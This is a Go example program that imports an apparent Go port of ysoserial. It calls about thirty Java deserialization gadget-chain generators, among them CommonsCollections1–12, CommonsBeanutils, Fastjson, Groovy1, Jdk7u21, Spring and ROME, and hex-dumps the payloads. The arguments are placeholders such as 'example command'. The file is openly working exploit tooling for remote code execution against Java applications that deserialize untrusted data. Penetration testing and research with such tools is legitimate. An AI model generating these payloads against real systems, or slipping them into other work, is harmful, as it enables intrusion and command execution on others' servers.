package main

import (
	"encoding/hex"
	"fmt"
	ysoserial "github.com/qi4L/GlangYsoserial.java/tree/master/Gadget"
)

func main() {

	// 如果你需要使用使用 TemplatesImpl 类实现的Gadget, 但是又懒得去JAVA实现后输出，可以调用 TemplatesImpl 函数的返回值作为参数
	fmt.Println(hex.Dump(ysoserial.TemplatesImpl("example command")))

	fmt.Println(hex.Dump(ysoserial.URLDNS("example domain")))
	fmt.Println(hex.Dump(ysoserial.Click1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Clojure("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsBeanutils1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsBeanutils2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections1("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections3([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections4([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections5("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections6("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections7("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections8([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections9("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections10([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections11("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections12("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollectionsK1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollectionsK2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Fastjson1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Fastjson2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Groovy1("example command")))
	fmt.Println(hex.Dump(ysoserial.Jdk7u21([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Jdk8u20([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.JSON1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.ROME([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.ROME2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.ROME3([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Spring1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Spring2([]byte("example bytes"))))
}
